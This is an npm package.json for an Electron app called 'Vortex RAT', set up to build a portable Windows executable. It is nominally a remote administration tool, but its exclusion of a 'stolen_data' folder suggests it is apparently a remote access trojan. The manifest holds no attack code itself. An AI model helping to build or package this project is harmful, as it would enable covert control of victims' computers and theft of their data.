{
  "name": "vortex-rat",
  "version": "1.0.0",
  "description": "Vortex RAT - Remote Administration Tool",
  "author": "Rayzer",
  "main": "main.js",
  "scripts": {
    "start": "electron .",
    "dev": "electron .",
    "build": "electron-builder --win"
  },
  "build": {
    "appId": "com.vortex.rat",
    "productName": "VortexRAT",
    "win": {
      "target": "portable",
      "icon": "icon.ico"
    },
    "directories": {
      "output": "dist"
    },
    "files": [
      "**/*",
      "!builds/*",
      "!stolen_data/*",
      "node_modules/**/*"
    ]
  },
  "dependencies": {},
  "devDependencies": {
    "electron": "^28.0.0",
    "electron-builder": "^26.7.0",
    "pkg": "^5.8.1"
  }
}
